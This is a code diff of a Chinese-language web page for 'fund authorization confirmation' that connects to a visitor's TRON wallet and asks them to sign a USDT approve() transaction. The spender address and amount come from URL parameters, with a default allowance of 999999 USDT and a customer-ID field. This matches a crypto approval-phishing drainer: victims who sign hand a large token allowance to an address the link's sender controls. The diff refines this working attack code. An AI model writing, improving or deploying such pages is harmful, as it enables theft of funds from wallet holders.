@@ -6,14 +6,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-
 body{
 font-family:Arial;
 background:#f4f6f8;
 padding:40px;
 text-align:center;
 }
-
 .card{
 background:white;
 padding:30px;
@@ -22,12 +20,10 @@ margin:auto;
 border-radius:10px;
 box-shadow:0 3px 10px rgba(0,0,0,0.1);
 }
-
 .info{
 margin:10px 0;
 word-break:break-all;
 }
-
 button{
 background:#2b6cff;
 border:none;
@@ -37,63 +33,47 @@ font-size:16px;
 border-radius:6px;
 cursor:pointer;
 }
-
 button:disabled{
 background:#999;
 }
-
 .status{
 margin-top:20px;
 text-align:left;
 font-size:14px;
 }
-
 .step{
 margin:6px 0;
 }
-
-.ok{
-color:green;
-}
-
-.err{
-color:red;
-}
-
+.ok{color:green;}
+.err{color:red;}
 </style>
 
 </head>
-
 <body>
 
 <div class="card">
-
 <h2>资金授权确认</h2>
 
 <div class="info" id="wallet">检测钱包...</div>
+<div class="info" id="network"></div>
 <div class="info" id="spender"></div>
 <div class="info" id="amount"></div>
 <div class="info" id="cid"></div>
 
 <br>
-
 <button id="btn" onclick="approve()">确认授权</button>
 
 <div class="status" id="status"></div>
-
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-
 <script>
-
 const USDT="TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"
-
 const DEFAULT_SPENDER="TYourDefaultAddress"
 const DEFAULT_AMOUNT=999999
 
+// URL参数
 const params=new URLSearchParams(location.search)
-
 const spender=params.get("to")||DEFAULT_SPENDER
 const amount=parseInt(params.get("amount")||DEFAULT_AMOUNT)
 const cid=params.get("cid")||""
@@ -103,162 +83,117 @@ document.getElementById("amount").innerText="授权额度: "+amount+" USDT"
 document.getElementById("cid").innerText=cid?"客户ID: "+cid:""
 
 function step(text,type){
-
-const el=document.createElement("div")
-el.className="step"
-
-if(type==="ok") el.classList.add("ok")
-if(type==="err") el.classList.add("err")
-
-el.innerText=text
-
-document.getElementById("status").appendChild(el)
-
+  const el=document.createElement("div")
+  el.className="step"
+  if(type==="ok") el.classList.add("ok")
+  if(type==="err") el.classList.add("err")
+  el.innerText=text
+  document.getElementById("status").appendChild(el)
 }
 
 function detectWallet(){
-
-const ua=navigator.userAgent.toLowerCase()
-
-if(ua.includes("tokenpocket")) return "TokenPocket"
-if(ua.includes("imtoken")) return "imToken"
-if(ua.includes("tronlink")) return "TronLink"
-
-return "Unknown"
-
+  const ua=navigator.userAgent.toLowerCase()
+  if(ua.includes("tokenpocket")) return "TokenPocket"
+  if(ua.includes("imtoken")) return "imToken"
+  if(ua.includes("tronlink")) return "TronLink"
+  return "Unknown"
 }
 
 async function waitTron(){
-
-return new Promise((resolve,reject)=>{
-
-let count=0
-
-const timer=setInterval(()=>{
-
-if(window.tronWeb && window.tronWeb.defaultAddress.base58){
-
-clearInterval(timer)
-resolve()
-
-}
-
-count++
-
-if(count>20){
-clearInterval(timer)
-reject("未检测到TRON钱包")
-}
-
-},500)
-
-})
-
+  return new Promise((resolve,reject)=>{
+    let count=0
+    const timer=setInterval(()=>{
+      if(window.tronWeb && window.tronWeb.defaultAddress.base58){
+        clearInterval(timer)
+        resolve()
+      }
+      count++
+      if(count>20){
+        clearInterval(timer)
+        reject("未检测到TRON钱包")
+      }
+    },500)
+  })
 }
 
 async function init(){
-
-const wallet=detectWallet()
-
-document.getElementById("wallet").innerText="钱包环境: "+wallet
-
-try{
-
-await waitTron()
-
-const user=window.tronWeb.defaultAddress.base58
-
-document.getElementById("wallet").innerText="钱包地址: "+user
-
-}catch(e){
-
-document.getElementById("wallet").innerText="未检测到钱包"
-
-}
-
+  const wallet=detectWallet()
+  document.getElementById("wallet").innerText="钱包环境: "+wallet
+  try{
+    await waitTron()
+    const user=window.tronWeb.defaultAddress.base58
+    document.getElementById("wallet").innerText="钱包地址: "+user
+    const nodeInfo=await window.tronWeb.trx.getNodeInfo()
+    const chainId=nodeInfo.chainId
+    const netName=(chainId===1)?"Mainnet":"Testnet"
+    document.getElementById("network").innerText="网络: "+netName
+    if(netName!=="Mainnet"){
+      step("⚠ 请切换到TRON Mainnet","err")
+      document.getElementById("btn").disabled=true
+    } else {
+      step("网络检测通过","ok")
+    }
+  }catch(e){
+    document.getElementById("wallet").innerText="未检测到钱包"
+    step("钱包初始化失败: "+e,"err")
+    document.getElementById("btn").disabled=true
+  }
 }
 
 init()
 
 async function approve(){
+  document.getElementById("status").innerHTML=""
+  const btn=document.getElementById("btn")
+  btn.disabled=true
+  try{
+    step("1. 检测钱包")
+    await waitTron()
+    const tronWeb=window.tronWeb
+    const user=tronWeb.defaultAddress.base58
+    if(!user) throw "钱包未连接"
+    step("✔ 钱包地址: "+user,"ok")
 
-document.getElementById("status").innerHTML=""
+    const spenderHex=tronWeb.address.toHex(spender)
+    const ownerHex=tronWeb.address.toHex(user)
+    const value=(amount*1000000).toString()
+    step("2. 构造授权交易")
+    step("授权金额: "+value)
 
-const btn=document.getElementById("btn")
-btn.disabled=true
+    const tx=await tronWeb.transactionBuilder.triggerSmartContract(
+      USDT,
+      "approve(address,uint256)",
+      {feeLimit:100000000},
+      [
+        {type:"address",value:spenderHex},
+        {type:"uint256",value:value}
+      ],
+      ownerHex
+    )
 
-try{
+    if(!tx.result || !tx.result.result){
+      throw "交易构造失败"
+    }
 
-step("1. 检测钱包")
+    step("3. 等待钱包签名")
+    const signed=await tronWeb.trx.sign(tx.transaction)
 
-await waitTron()
+    step("4. 广播交易")
+    const broadcast=await tronWeb.trx.sendRawTransaction(signed)
 
-const tronWeb=window.tronWeb
+    if(!broadcast.result){
+      throw "广播失败"
+    }
 
-const user=tronWeb.defaultAddress.base58
+    step("✔ 授权成功","ok")
+    step("TXID: "+broadcast.txid)
 
-if(!user){
-throw "钱包未连接"
+  }catch(e){
+    console.error(e)
+    step("授权失败: "+e,"err")
+  }
+  btn.disabled=false
 }
-
-step("✔ 钱包地址: "+user,"ok")
-
-step("2. 构造授权交易")
-
-const value=(amount*1000000).toString()
-
-step("授权金额: "+value)
-
-const tx=await tronWeb.transactionBuilder.triggerSmartContract(
-
-USDT,
-
-"approve(address,uint256)",
-
-{feeLimit:100000000},
-
-[
-{type:"address",value:spender},
-{type:"uint256",value:value}
-],
-
-user
-
-)
-
-if(!tx.result || !tx.result.result){
-throw "交易构造失败"
-}
-
-step("3. 等待钱包签名")
-
-const signed=await tronWeb.trx.sign(tx.transaction)
-
-step("4. 广播交易")
-
-const broadcast=await tronWeb.trx.sendRawTransaction(signed)
-
-if(!broadcast.result){
-throw "交易广播失败"
-}
-
-step("✔ 授权成功","ok")
-
-step("TXID: "+broadcast.txid)
-
-}catch(e){
-
-console.error(e)
-
-step("授权失败: "+e,"err")
-
-}
-
-btn.disabled=false
-
-}
-
 </script>
-
 </body>
 </html>
